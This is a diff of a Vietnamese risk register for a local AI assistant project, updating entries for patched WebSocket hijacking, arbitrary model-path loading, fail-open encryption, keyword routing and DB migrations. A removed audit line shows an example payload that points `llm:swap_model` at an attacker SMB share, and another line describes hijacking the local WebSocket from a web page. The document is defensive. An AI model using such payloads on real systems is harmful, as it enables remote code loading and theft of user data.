@@ -1,7 +1,8 @@
 ---
 title: "Nợ kỹ thuật và rủi ro"
-updated: 2026-07-23
-commit: 3b6caa9
+updated: 2026-07-26
+commit: 0b490b9
+stale-ok: bedff83
 status: living
 owns:
   - bang-rui-ro-xep-hang
@@ -57,12 +58,23 @@ Nhãn trạng thái dùng xuyên suốt bộ tài liệu:
 
 ## 0. Tóm tắt điều hành
 
-| Mức | Số mục | Bản chất chủ đạo |
-|---|---|---|
-| **CRITICAL** | 3 | Bề mặt tấn công từ xa qua trình duyệt (C1, C2) + mã hoá fail-open (C3) |
-| **HIGH** | 7 | Lỗi chắc chắn xảy ra khi dùng thật (H3, H6), khoảng cách kiến trúc↔hành vi (H7), sandbox giả (H1 — **đã hạ mức 22/07/2026**, xem bên dưới) |
-| **MEDIUM** | 9 | Chất lượng vận hành: CI không gate, hai entry point lệch, test sai chỗ |
-| **LOW** | 12 | Dọn dẹp, code chết, tài liệu lệch code |
+| Mức | Số mục | Đã khép | Bản chất chủ đạo |
+|---|---|---|---|
+| **CRITICAL** | 3 | **3/3** (còn nợ có chủ đích) | Bề mặt tấn công từ xa qua trình duyệt (C1, C2) + mã hoá fail-open (C3) |
+| **HIGH** | 7 | **7/7** (6 vá + 1 hạ mức) | Lỗi chắc chắn xảy ra khi dùng thật (H3, H6), khoảng cách kiến trúc↔hành vi (H7), sandbox giả (H1) |
+| **MEDIUM** | 9 | *chưa rà lại đợt 26/07* | Chất lượng vận hành: CI không gate, hai entry point lệch, test sai chỗ |
+| **LOW** | 12 | *chưa rà lại đợt 26/07* | Dọn dẹp, code chết, tài liệu lệch code |
+
+> **Đọc bảng trên cho đúng.** "Đã khép" **không** có nghĩa là rủi ro biến mất — nghĩa là **chế độ hỏng cụ thể được mô tả ở mục đó** đã không còn tái hiện được, và mỗi mục ghi rõ phần **còn tồn** ngay tại chỗ. Bốn khoản nợ còn lại đáng nhớ, tất cả đều là **lựa chọn có chủ đích chứ không phải sót**:
+>
+> | Mục | Còn tồn |
+> |---|---|
+> | C1 | Lớp 2 (token phiên) **cố ý không làm** — với kẻ tấn công đã có mặt trên localhost, token cùng máy không tạo ranh giới thật. Allow-list lệnh theo kênh vẫn chưa có |
+> | C3 | `DEFAULT_ENCRYPTION_KEY` vẫn là đường thoát cho dữ liệu dev: cảnh báo lớn, **không** chặn boot |
+> | H4 | **Chưa có bước xác nhận cho hành động vật lý** — bắt buộc phải có trước khi nối phần cứng smart home thật |
+> | H5 | Thiếu `vec0` vẫn chặn boot; chỉ khác là nay báo rõ cách sửa, chưa có chế độ suy giảm memory-only |
+>
+> **MEDIUM và LOW chưa được rà lại trong đợt 26/07/2026.** Ghi rõ ở đây thay vì để người đọc tưởng cả tài liệu vừa được xác minh — xem [U4 trong backlog nâng cấp](05-nang-cap-toan-dien.md).
 
 **Điểm tốt cần ghi nhận trước** (đã kiểm chứng, không phải lời khen xã giao):
 
@@ -89,8 +101,8 @@ flowchart LR
 | # | Vấn đề | Bằng chứng | Hệ quả | Đề xuất |
 |---|---|---|---|---|
 | **C1** ⚠️ **LỚP 1 ĐÃ SỬA 21/07/2026** | **WebSocket 8002 không xác thực, không kiểm `Origin` → Cross-Site WebSocket Hijacking** | `main.rs:446-492` `accept_hdr_async` **chỉ kiểm `req.uri().path()`**; `main.rs:580-587` `OP_AUTH_HANDSHAKE` chỉ **echo**; `main.rs:958-1000` `IpcRequest` → thẳng `handle_command` **không allow-list** | WebSocket **không** chịu Same-Origin Policy. Bất kỳ tab trình duyệt nào cũng có thể `new WebSocket("ws://127.0.0.1:8002/ws")` và: chụp + rút ảnh màn hình (`vision:capture`), đọc `ai.cloudApiKey` (`get_config`), đọc bộ nhớ/hồ sơ cá nhân, gửi tin Telegram, ghi đè config. Bind `127.0.0.1` **không bảo vệ** trước lớp tấn công này | **Đã làm (F4 lớp 1):** allow-list `Origin` qua `origin_allowed` (`lib.rs`), handshake sai origin bị trả **403 ngay ở tầng HTTP** (`main.rs:478`) chứ không phải hoàn tất rồi đóng. Mặc định cho `localhost:5173`, `127.0.0.1:5173`, `tauri://localhost`, `https://tauri.localhost`; mở rộng bằng `LIVA_WS_ALLOWED_ORIGINS`. 6 unit test gồm ca tấn công thật (`https://evil.example`, `null`, và các biến thể tiền tố/hậu tố như `http://localhost:5173.evil.example`). **CHƯA làm (lớp 2 — token phiên):** xem phân tích ở dưới, giá trị thực tế rất thấp so với thiết kế ban đầu. **CHƯA làm:** allow-list lệnh theo kênh |
-| **C2** | **`llm:swap_model` nạp file tùy ý từ đường dẫn client cung cấp** | `lib.rs:1265-1281` — không canonicalize, không kiểm prefix, không giới hạn trong `ai.localModelsDir`. So sánh: MCP có guard (`mcp/server.rs:66-77`) | Ghép với C1: trang web đẩy `{"command":"llm:swap_model","payload":{"model_path":"\\\\attacker\\share\\evil.gguf"}}` → LIVA tải file từ SMB kẻ tấn công và ném vào parser GGUF C++ ⇒ bề mặt memory-corruption trực tiếp. Ngay cả không có C1, `update_config` cho ghi `ai.localModelsDir` tuỳ ý rồi tự nạp | Canonicalize + bắt buộc `starts_with(models_root)`; chỉ nhận **tên file**; từ chối UNC/absolute |
-| **C3** | **`EncryptionEngine`: khoá mặc định công khai, không KDF, giải mã fail-open** | `crypto.rs:15-21` (không KDF, pad `0x00`); `main.rs:62-63` + Tauri `lib.rs:270-271` default `"0"×32`; `crypto.rs:50-88` `decrypt()` trả `String`, mọi lỗi kể cả **xác thực GCM thất bại** đều `return text.to_string()` | (a) DB `facts.value` coi như không mã hoá với cấu hình mặc định; (b) toàn vẹn **không bao giờ được thực thi** — sửa DB → decrypt "thành công" trả rác, rác đi thẳng vào prompt LLM; (c) đổi khoá → mọi fact cũ im lặng thành ciphertext hex trong prompt | KDF thật (Argon2id/HKDF) + salt trong DB; **bỏ default key**, thiếu key thì fail-fast; `decrypt(&self) -> Result<String, DecryptError>`; version-tag ciphertext |
+| ~~**C2**~~ ✅ **ĐÃ SỬA 22/07/2026** | **`llm:swap_model` nạp file tùy ý từ đường dẫn client cung cấp** | `validate_model_path` (`lib.rs:557`, hàm thuần có test) bắt buộc: đuôi `.gguf` (không phân biệt hoa thường), **nằm trong** thư mục model đã cấu hình, chặn `..` kể cả dạng lồng `sub/../../x.gguf` | Áp ở **hai** chỗ, không chỉ một: nhánh `llm:swap_model` (`lib.rs:2234`) **và** điểm nạp thật `load_configured_router_model` — nên `update_config` ghi `ai.routerModel` độc hại cũng bị chặn khi reload. Đây là điểm đáng ghi nhận: vá ở cả đường ghi cấu hình chứ không chỉ đường lệnh trực tiếp | `validate_model_path_tests` (`lib.rs:2703`) phủ đúng các payload nêu ở cột bằng chứng cũ. UI không gọi `swap_model` nên vá không phá client nào |
+| ~~**C3**~~ ✅ **ĐÃ SỬA 22/07/2026 (còn 1 khoản nợ có chủ đích)** | **`EncryptionEngine`: khoá mặc định công khai, không KDF, giải mã fail-open** | Định dạng **v2** có version-tag (`V2_PREFIX = "v2:"`, `crypto.rs:13`): **HKDF-SHA256 + salt 16 byte mỗi bản ghi** (`derive_key`, `crypto.rs:114`), `info` cố định ràng khoá vào đúng mục đích. `try_decrypt` (`crypto.rs:233`) trả `Result<_, DecryptError>`; `read_fact` trả `FactRead::Ok | FactRead::Locked{reason}` | **Hết fail-open.** Sửa DB → `AuthFailed` → `FactRead::Locked`, **không** trả rác vào prompt; đổi khoá → bản ghi cũ hiện là *khoá-chết* có nhãn chứ không im lặng thành hex. `Locked` **không mang ciphertext ra ngoài**, chỉ `reason` thô, nên caller log/serialize cũng không rò. Khoá boot per-machine qua DPAPI + `resolve_and_rekey` | **Khoản nợ CÒN LẠI, có chủ đích:** `DEFAULT_ENCRYPTION_KEY` (`crypto.rs:16`) vẫn tồn tại làm đường thoát cho dữ liệu dev — dùng nó thì **cảnh báo lớn một lần** (`crypto.rs:95`) nhưng **không chặn boot**. Đây là quyết định đã ghim, không phải sơ suất; xem §8 của [backlog nâng cấp](05-nang-cap-toan-dien.md) |
 
 ### C1. WebSocket 8002 không xác thực → lộ toàn bộ tập lệnh IPC
 
@@ -178,9 +190,9 @@ pub fn new(key_str: &str) -> Self {
 | **H1** ⬇️ **HẠ MỨC 22/07/2026** | `evolution::Sandbox` **không phải sandbox** | `evolution/sandbox.rs:40-50` — `Command::new("cargo").arg("test")`. Cô lập duy nhất: `timeout(30s)` (`:104`). Không container, job object, hạ quyền, giới hạn network/fs | Nếu vòng self-correction từng được nối dây, code do LLM sinh sẽ chạy **toàn quyền user**. **Từ 22/07/2026 module nằm sau `#[cfg(feature = "experimental")]`** (`lib.rs:14-15`) ⇒ **không còn được biên dịch vào build mặc định**, và bộ test của nó **không còn chạy trong CI** (chỉ compile-check). Rủi ro tồn dư = ai đó bật `--features experimental` rồi nối dây mà quên | Nếu có ngày nối dây thật: đổi tên `TestRunner` + ghi rõ "KHÔNG cô lập", hoặc bắt buộc Windows Job Object + hạ quyền + chặn network **trước** khi gỡ feature-gate |
 | ~~**H2**~~ ✅ **ĐÃ SỬA 23/07/2026** | Stronghold vault mã hoá bằng mật khẩu/salt hardcode | `liva-desktop/src-tauri/src/lib.rs:123-129`, lặp `:384`. Snapshot `liva_vault.app` mở được bằng hằng số có trong mã nguồn công khai; salt cố định → rainbow table dùng chung | **Đã vá (thiết kế qua workflow phản biện, người dùng chốt 4 QĐ):** bỏ hardcode ở đường GHI — password/salt vault nay là **bí mật per-machine niêm phong DPAPI** (`keystore::load_or_create_vault_secret` → `.vault_secret` RIÊNG, cô lập khỏi khoá DB). `derive_vault_key` dùng chung Argon2 cho legacy+mới (cảnh báo không bump `rust-argon2`). Vault cũ **migrate lossless** (đọc bằng `legacy_vault_key`, enumerate `store.keys()`, ghi `.new` → verify → rename atomic giữ `.legacybak`); lỗi/mất DPAPI → **fail-soft reset** (sao lưu + báo nhập lại API key — vault re-enterable, khác facts DB). Gỡ hẳn plugin `tauri_plugin_stronghold` (literal salt cuối) + capability `stronghold:default`. Env `LIVA_STRONGHOLD_PASSWORD/SALT` giữ contract cũ (lenient). 230 lib+18 bin test pass. **E2E ĐÃ KIỂM (23/07):** 2 test dùng Stronghold thật — vault legacy 2 API key → migrate → key bảo toàn dưới khoá mới, `.legacybak` giữ, khoá legacy hết mở; vault rỗng → migrate từ chối. (e2e bắt được 1 giả định sai về `Stronghold::new`.) Migration vẫn bọc fail-soft |
 | ~~**H3**~~ ✅ **ĐÃ SỬA 21/07/2026** | **Không có guard `prompt_tokens > n_ctx`, lịch sử hội thoại KHÔNG bao giờ bị cắt** | `llm/engine.rs:260-278` prefill `decode` toàn bộ **không so `n_ctx`**; `prune_kv_cache` chỉ gọi trong vòng sinh token; `agent/graph.rs:156-172` duyệt **toàn bộ** `state.messages` | Sau vài chục lượt, prompt vượt 4096 token → `decode` lỗi; trợ lý "chết" giữa cuộc trò chuyện dài | **Đã sửa hai lớp (F2):** (1) `AgentState::trim_history()` (`agent/state.rs:12`) giữ tin `system` + `LIVA_MAX_HISTORY_MESSAGES` tin gần nhất, gọi ở `agent/graph.rs` cả trước khi dựng prompt lẫn sau khi thêm câu trả lời (chỗ sau ngăn `agent_checkpoints` phình sau F1); (2) guard cứng `check_prompt_fits` (`llm/engine.rs:82`) trong `generate_completion` — chặn cho **cả 6 call site**, biến crash khó hiểu thành lỗi có hướng khắc phục. 12 unit test phủ cả hai lớp, gồm ca tràn số. **Còn tồn:** chưa chạy hội thoại 50–100 lượt thật; guard mới chỉ kiểm bằng unit test trên hàm thuần |
-| **H4** | Router intent dùng `contains()` → kích hoạt tool sai | `agent/graph.rs:96-112` — `"ac"` ⊂ `back/track/machine`; `"on"` ⊂ `con/song/one/money/phone`. Đường này **[OK] chạy thật** (`pipeline.rs:271`) | "we're back on track" chạy `smart_home::execute`. Với thiết bị thật là hành động vật lý ngoài ý muốn. `contains("màn hình")` tự chụp màn hình **không xác nhận** | Khớp theo token có ranh giới, hoặc để LLM sinh tool-call có schema; xác nhận cho hành động vật lý |
+| ~~**H4**~~ ✅ **ĐÃ KHÉP 26/07/2026** | Router intent dùng `contains()` → kích hoạt tool sai | `route_intent` (`agent/graph.rs`) nay khớp **token trọn vẹn** (`has_word`/`has_phrase`) và có từ khoá tiếng Việt — vá cả dương tính giả lẫn **âm tính giả** ("bật đèn giúp mình" trước đây không khớp gì) | Chuỗi "định tuyến sai → hành động vật lý" đứt ở **hai chỗ độc lập**: (1) khớp token + test hồi quy ép `"back on track"`, `"coffee"`, `"office light"` → `Chat`; (2) `smart_home::execute` không còn báo thành công giả | **Còn tồn:** vẫn là định tuyến từ khoá (tool-calling LLM có nhưng **mặc định TẮT**); **xác nhận cho hành động vật lý CHƯA có** — cần trước khi nối phần cứng thật. Việc tự chụp màn hình không xác nhận theo dõi ở C1 |
 | ~~**H5**~~ ✅ **ĐÃ SỬA 23/07/2026** | Panic-on-boot: DB, LLM manager, phụ thuộc cứng `vec0.dll` | Thiếu `vec0.dll` hoặc DB khoá/hỏng → crash im lặng lúc khởi động, không màn hình lỗi | **Đã vá cả 3 phần:** (1) **binary standalone** — 3 điểm boot dùng `die()`/`die_db()` (0.6): stderr có hành động cụ thể + exit(1), không backtrace; (2) **vỏ Tauri** — `die_tauri_boot` hiện **MessageBox lỗi boot** (dùng chung `db_error_hint`: gợi ý `npm ci` khi thiếu vec0) thay vì panic im lặng, cho DB/LLM; (3) **đóng gói vec0** — `db::vec0_candidate_paths` nay thêm candidate **cạnh executable + `resources/`** (không phụ thuộc cwd/node_modules) + `tauri.conf.json` `bundle.resources` đưa `vec0.dll` vào installer. Runtime candidates có test; phần bundle chỉ verify đầy đủ được bằng `tauri build`. **Chưa làm:** chế độ suy giảm memory-only (thiếu vec0 vẫn chặn boot, chỉ khác là báo rõ) |
-| **H6** | **Không có hệ thống migration DB** | `db.rs:188-354` là một `execute_batch` toàn `CREATE TABLE IF NOT EXISTS`. Không `user_version`, không `schema_migrations`, **không một `ALTER TABLE` nào** | Mọi DB đã tồn tại trên máy người dùng **không bao giờ nhận cột mới**. Lần tới thêm cột → `SELECT` mới lỗi runtime trên máy cũ. Quả bom hẹn giờ với 5 beta tester đang có DB thật | Thêm `user_version` + migration tuyến tính **ngay bây giờ**, khi mới có 5 người dùng |
+| ~~**H6**~~ ✅ **ĐÃ SỬA 22/07/2026** | **Không có hệ thống migration DB** | `SCHEMA_VERSION = 3` (`db.rs:413`) + `MIGRATIONS: &[(i64, &str)]` (`db.rs:422`) + `run_migrations` (`db.rs:450`): đọc `PRAGMA user_version`, áp tuần tự từng migration **trong transaction**, đóng dấu version sau mỗi bước | DB cũ (`user_version = 0` nhưng đủ bảng baseline) được **đóng dấu lên 1 không mất dữ liệu**; DB từ bản LIVA **mới hơn** bị **từ chối tường minh** (`db.rs:453`) thay vì chạy mù trên schema lạ | **Kiểm chứng sống 26/07/2026:** khởi động lõi trên DB trống in đúng `DB migration: đã nâng schema lên version 2` rồi `version 3`. Có test hồi quy cho cả hai chiều (nâng cấp giữ dữ liệu; từ chối DB tương lai) |
 | ~~**H7**~~ ✅ **ĐÃ KHÉP 23/07/2026** | Bộ nhớ dài hạn từng không nối vào đường hội thoại | Recall/persist scoped chạy trên ba cửa vào; event + vector/FTS ghi atomic; projection consumer có checkpoint, retry/DLQ và chạy ở hai runtime | Producer, recall và projection finalization đã có; semantic extraction/L3 vẫn là khoản nợ riêng | Tiếp theo: Reflection/fact-relation extraction từ event đã finalized |
 
 ### H1. `evolution::Sandbox` không phải sandbox — chạy `cargo test` thẳng trên host ⬇️ **HẠ MỨC 22/07/2026**
@@ -246,9 +258,15 @@ Cùng cặp giá trị lặp lại ở `lib.rs:384` (closure Argon2id của plug
 > 📌 Nguồn đầy đủ (cấu hình LLM, `n_ctx`, cách dựng prompt): [Hệ LLM và prompt](../01-ban-ve/04-he-llm-va-prompt.md)
 > 📌 Nguồn đầy đủ (hướng dẫn sửa F2): [Lộ trình sửa lỗi và nâng cấp](03-lo-trinh-sua-loi-va-nang-cap.md)
 
-### H4. Router intent dùng `contains()` trên chuỗi con → kích hoạt tool sai
+### H4. Router intent dùng `contains()` trên chuỗi con → kích hoạt tool sai — **ĐÃ KHÉP 26/07/2026**
 
-**Bằng chứng:** `agent/graph.rs:96-112`
+> **Đã vá.** `route_intent` (`agent/graph.rs`) nay khớp theo **token trọn vẹn** qua `has_word`/`has_phrase`, **và** có từ khoá tiếng Việt (`đèn`, `quạt`, `điều hoà`, `máy lạnh`, `bật`, `tắt`, `mở`, `đóng`) — tức vá luôn **âm tính giả** nêu ở cuối mục này, không chỉ dương tính giả. Doc-comment ngay trên hàm liệt kê đúng các câu bản cũ hiểu sai, và có khối test hồi quy ép chúng: `"let's get back on track"`, `"I want coffee and a fan"`, `"the office light"`, `"place it on the table"`, `"how much money for the lamp"` → tất cả phải là `Intent::Chat`.
+>
+> **Hai lớp giảm nhẹ bổ sung, ngoài phạm vi đề xuất gốc.** (1) `Intent::Vision` được ưu tiên **trước** nhánh thiết bị, nên "bật đèn trên màn hình" đi vào vision chứ không thành lệnh thiết bị. (2) Kể cả khi định tuyến sai, `smart_home::execute` nay **không báo thành công giả** — nó nói thẳng là chưa có tích hợp phần cứng (xem 5.6). Tức chuỗi "định tuyến sai → hành động vật lý ngoài ý muốn" **đứt ở hai chỗ độc lập**.
+>
+> **Còn lại:** đây vẫn là định tuyến theo từ khoá. Đề xuất "để chính LLM sinh tool-call có schema" đã thành hiện thực ở `llm/tool_calling.rs` (`45e2e58`) nhưng **mặc định TẮT** (`LIVA_TOOL_CALLING=1`) — nên đường nhanh keyword vẫn là đường mặc định. **Bước xác nhận cho hành động vật lý vẫn CHƯA có** và sẽ cần thiết ngay khi nối phần cứng thật.
+
+**Bằng chứng (bản cũ, giữ để đối chiếu lịch sử):** ~~`agent/graph.rs:96-112`~~
 
 ```rust
 let device = if text_lower.contains("light") { Some("light") }
@@ -260,9 +278,11 @@ let action = if text_lower.contains("on") { Some("on") }
 
 `"ac"` là chuỗi con của `back`, `track`, `accept`, `machine`, `character`…; `"on"` là chuỗi con của `con`, `song`, `one`, `money`, `phone`, `only`… Đường đi này **[OK] chạy thật** — `build_pipeline_graph` được gọi tại `webrtc/pipeline.rs:271`.
 
-**Hệ quả:** Câu "we're back on track" hay "cái điện thoại đó" (nếu có "ac"/"on") sẽ chạy `integrations::smart_home::execute` và trả tool result vào prompt. Với thiết bị thật, đây là hành động vật lý ngoài ý muốn. Ngoài ra `contains("màn hình")||contains("screen")` (`graph.rs:115`) tự chụp màn hình mà **không có xác nhận nào** — quyện với C1 thành kênh rò rỉ.
+**Hệ quả (bản cũ):** Câu "we're back on track" hay "cái điện thoại đó" (nếu có "ac"/"on") sẽ chạy `integrations::smart_home::execute` và trả tool result vào prompt. Với thiết bị thật, đây là hành động vật lý ngoài ý muốn.
 
-**Đề xuất:** Chuyển sang khớp theo token/từ có ranh giới, hoặc để chính LLM sinh tool-call có schema; thêm bước xác nhận cho hành động vật lý.
+**Đề xuất (bản cũ) — đã thực hiện:** chuyển sang khớp theo token/từ có ranh giới ✅; để chính LLM sinh tool-call có schema ✅ (opt-in); thêm bước xác nhận cho hành động vật lý ❌ **chưa làm**.
+
+**Phần CHƯA khép của mục này:** việc tự chụp màn hình khi câu nói khớp từ khoá màn hình **vẫn không có xác nhận nào**. Nhánh `Intent::Vision` nay còn được ưu tiên **cao nhất**, nên nó dễ kích hoạt hơn trước chứ không khó hơn. Quyện với C1 vẫn là kênh rò rỉ — theo dõi ở đó, không đóng theo H4.
 
 ### H5. Panic-on-boot: DB, LLM manager, và phụ thuộc cứng vào `vec0.dll`
 
@@ -278,13 +298,15 @@ let action = if text_lower.contains("on") { Some("on") }
 
 **Đề xuất:** Thay `.expect` bằng đường xử lý lỗi có UI: báo lỗi rõ ràng + chạy chế độ suy giảm (memory-only, không vector). Đóng gói `vec0.dll` cùng bundle thay vì phụ thuộc `node_modules`.
 
-### H6. Không có hệ thống migration DB
+### H6. Không có hệ thống migration DB — **ĐÃ SỬA 22/07/2026**
 
-**Bằng chứng:** `db.rs:188-354` là một `execute_batch` duy nhất toàn `CREATE TABLE IF NOT EXISTS`. Không `PRAGMA user_version`, không bảng `schema_migrations`, **không một câu `ALTER TABLE` nào trong `liva-native-core/src/`**.
+> **Đã vá.** `SCHEMA_VERSION: i64 = 3` (`db.rs:413`), danh sách `MIGRATIONS: &[(i64, &str)]` (`db.rs:422`) và `run_migrations` (`db.rs:450`) đọc `PRAGMA user_version` rồi áp tuần tự từng bước **trong transaction**, đóng dấu version sau mỗi bước.
+>
+> Hai ca biên được xử lý tường minh, và đây mới là phần đáng ghi nhận: (1) DB **cũ** ở `user_version = 0` nhưng đã đủ bảng baseline được **đóng dấu lên 1 mà không mất dữ liệu** — đúng tình huống của 5 beta tester đang có DB thật; (2) DB tạo bởi bản LIVA **mới hơn** bị **từ chối tường minh** (`db.rs:453`) thay vì chạy mù trên schema lạ, tức tránh được kiểu hỏng âm thầm khi người dùng hạ cấp bản build.
+>
+> **Kiểm chứng sống 26/07/2026:** khởi động lõi trên DB trống in đúng `DB migration: đã nâng schema lên version 2` rồi `version 3`. Có test hồi quy cho cả hai chiều.
 
-**Hệ quả:** Mọi DB đã tồn tại trên máy người dùng sẽ **không bao giờ nhận cột mới**. Lần tới thêm cột → `SELECT` mới lỗi runtime trên máy cũ, chạy tốt trên máy mới. Đây là quả bom hẹn giờ với 5 beta tester đang có DB thật (`data/agents/liva_core/structured_memory.sqlite` + WAL 2 MB).
-
-**Đề xuất:** Thêm `user_version` + danh sách migration tuyến tính ngay bây giờ, khi mới có 5 người dùng.
+**Bằng chứng (bản cũ, giữ để đối chiếu lịch sử):** ~~`db.rs:188-354`~~ từng là một `execute_batch` duy nhất toàn `CREATE TABLE IF NOT EXISTS`, không `PRAGMA user_version`, không bảng `schema_migrations`, không một câu `ALTER TABLE` nào.
 
 > 📌 Nguồn đầy đủ (ERD, 15 bảng, PRAGMA, pool SQLite): [Tầng dữ liệu và bảo mật](../01-ban-ve/07-tang-du-lieu-va-bao-mat.md)
 
@@ -397,7 +419,7 @@ flowchart TB
     subgraph OK["[OK] — nối dây, chạy trên đường mặc định"]
         crypto[crypto] --- db[(db)] --- llm[llm] --- stt[stt] --- tts[tts]
         frame[webrtc::frame] --- vad[webrtc::vad] --- den[webrtc::denoise]
-        vis[vision::capture] --- gov[governor] --- sm[integrations::smart_home<br/>execute = stub]
+        vis[vision::capture] --- gov[governor] --- sm[integrations::smart_home<br/>chưa có I/O phần cứng<br/>báo trung thực, không thành-công-giả]
     end
     subgraph PARTIAL["[MỘT PHẦN] — opt-in bằng env, mặc định TẮT"]
         par[stt::parakeet] --- vieneu[tts::vieneu] --- aec[webrtc::aec]
@@ -434,10 +456,10 @@ Ký hiệu: **ĐÃ NỐI [OK]** = có call-site trong `src/` ngoài test/bin · 
 | `webrtc::turn_shadow` | `main.rs:214-230, 676-688` | **[MỘT PHẦN]** OPT-IN + **shadow** (chỉ log, không gate gì) | `main.rs:214` |
 | `webrtc::pipeline` | `main.rs:509-510` (chỉ binary standalone) | **[MỘT PHẦN]** ĐÃ NỐI ở bin `liva-native-core`; **KHÔNG** ở Tauri | Tauri `lib.rs:362-365` hard-code `vad/denoiser/turn_shadow/aec = None`, không tạo `WebRTCActor` |
 | ~~`webrtc::signaling`~~ | — | **ĐÃ XOÁ 22/07/2026** | File `src/webrtc/signaling.rs` bị xoá ở commit `510c9e2` (mục 3.1) — lý do phụ: nó `bind("0.0.0.0")`. `src/webrtc/mod.rs` nay chỉ còn 6 module (`frame`, `vad`, `denoise`, `turn_shadow`, `aec`, `pipeline`) |
-| `integrations::smart_home` | `agent/graph.rs:137`, `lib.rs:530,1475,1480` | **[MỘT PHẦN]** ĐÃ NỐI nhưng `execute` là stub trả chuỗi | |
+| `integrations::smart_home` | `build_pipeline_graph` (`agent/graph.rs`), `handle_command` (`integration:smart_home_control`, `integrations:list`), **và** tool MCP `control_smarthome` (`mcp/server.rs`) | **[MỘT PHẦN]** ĐÃ NỐI ở ba đường; `execute` chưa có I/O phần cứng nhưng **báo trung thực**, có test ép | Ba đường vào nay đi qua **cùng một** `execute` nên cho cùng một câu trả lời (`45e2e58`); kiểm lại 26/07/2026 |
 | `telegram` | `main.rs:333` | **[MỘT PHẦN]** OPT-IN (`TELEGRAM_BOT_TOKEN` phải có) + **vòng lặp không khép kín** (§5.4) | |
 | `mcp::server` | `main.rs:171` + `lib.rs:44` (nhét vào `AppState`), **và nay có arm IPC**: `lib.rs:1575` `"mcp:list_tools"`, `lib.rs:1578-1593` `"mcp:call_tool"` | **[OK]** ĐÃ NỐI ở tầng IPC (từ mục 2.7) — nhưng chưa client nào gọi hai lệnh này | `list_tools()`/`call_tool()` (`mcp/server.rs:39,79`) có caller production; kiểm lại 22/07/2026 |
-| `mcp::client` | **KHÔNG AI GỌI** | **[THIẾU]** MỒ CÔI | `ProcessWrapper::spawn/send_request/read_response` (`client.rs:11,24,36`) — grep repo (trừ `target/`) chỉ ra chính file đó |
+| `mcp::client` | `handle_command`: `mcp_client:list_servers`, `mcp_client:list_tools`, `mcp_client:call_tool` | **[OK]** — **KHÔNG còn mồ côi từ 26/07/2026** | Viết lại thành **MCP client stdio thật** (G0, `8e7511f` + `4f5e326`, ~1 035 dòng). Có e2e với server `npx` thật: `tests/mcp_client_e2e.rs` (`ba_lenh_mcp_client_da_noi_vao_dispatch`, `vong_doi_mcp_server_ngoai`) — 4/4 đạt ngày 26/07/2026. Bản trước ghi 49 dòng mồ côi; đã lỗi thời |
 | `mcp::protocol` | `Tool/ToolList/CallToolRequest/CallToolResult/ToolContent` dùng bởi `server.rs`; **`JsonRpcRequest/JsonRpcResponse/JsonRpcNotification/JsonRpcError` = 0 tham chiếu toàn repo** | **[THIẾU]** MỒ CÔI (một nửa file) | grep 4 tên struct này ngoài `protocol.rs` → rỗng |
 | `agent::state` | `pipeline.rs:259` | **[OK]** ĐÃ NỐI | |
 | `agent::graph` | `pipeline.rs:271` | **[OK]** ĐÃ NỐI (chỉ đường voice, không phải `chat:completion`) | |
@@ -554,8 +576,8 @@ Grep `TODO|FIXME|unimplemented!|todo!()|XXX|HACK` trên toàn `src/` (`--include
 
 **Không có `unimplemented!()`, `todo!()`, `panic!("not implemented")` nào.** Nhưng có nhiều "stub trả literal" tương đương, **không** được đánh dấu TODO — nguy hiểm hơn vì không grep ra được:
 
-- `mcp/server.rs:176` — tool `control_smarthome` chỉ `format!("Command '{}' sent to '{}'")`, **không** gọi `integrations::smart_home::execute`.
-- `integrations/smart_home.rs:51-67` — `execute()` chỉ log + trả `Ok(format!("Device '{}' successfully turned '{}'."))`, không có I/O thiết bị. Crate không có dep MQTT/HTTP nào cho việc này.
+- ~~`mcp/server.rs:176` — tool `control_smarthome` chỉ `format!("Command '{}' sent to '{}'")`, **không** gọi `integrations::smart_home::execute`.~~ **ĐÃ SỬA 26/07/2026** (`45e2e58`): nhánh `"control_smarthome"` nay gọi thẳng `crate::integrations::smart_home::execute(payload)` và trả đúng chuỗi của nó. Lý do ghi tại chỗ đáng chú ý: hai đường vào cùng một năng lực (từ khoá qua `tool_exec`, và LLM qua tool MCP) **phải cho cùng một câu trả lời** — nếu không thì "hai đường khớp nhau" chỉ đúng ở tên tool mà sai ở thứ người dùng nghe được. Cùng đợt, `ControlSmartHomeArgs` bỏ `{device: String, command: String}` để dùng lại **đúng enum** của `integrations::smart_home` (thêm `schemars::JsonSchema`), vì schema chỉ nói `device: string` khiến gemma-4-E4B sinh `"air conditioner"`/`"turn on"` — chọn đúng tool 13/13 mà **tham số sai 9/13**.
+- ~~`integrations/smart_home.rs:51-67` — `execute()` chỉ log + trả `Ok(format!("Device '{}' successfully turned '{}'."))`~~ **ĐÃ SỬA 23/07/2026**: trả thông báo trung thực `"Chưa điều khiển được thiết bị thật: … hiện CHƯA kết nối tích hợp nhà thông minh nào"`, có test `test_execute_bao_trung_thuc_khong_thanh_cong_gia` ép không được báo thành công giả. **Vẫn đúng:** không có I/O thiết bị, crate không có dep MQTT/HTTP nào cho việc này — năng lực chưa có, chỉ khác là nó không còn nói dối về điều đó.
 - `agent/dispatcher.rs:116-136` — logic 4 role đều là chuỗi hardcode (`"// Auto-generated Rust Code\nfn main() { println!(\"Done: {}\"); }"`, `"Role {:?} stub response"`), **không gọi LLM**. (Từ 22/07/2026 file này nằm sau feature `experimental` nên stub không còn trong build mặc định.)
 - `telegram.rs:117` — `/status` trả chuỗi cứng `"🟢 Hệ thống LIVA Native Engine đang hoạt động bình thường."`, không kiểm tra gì.
 
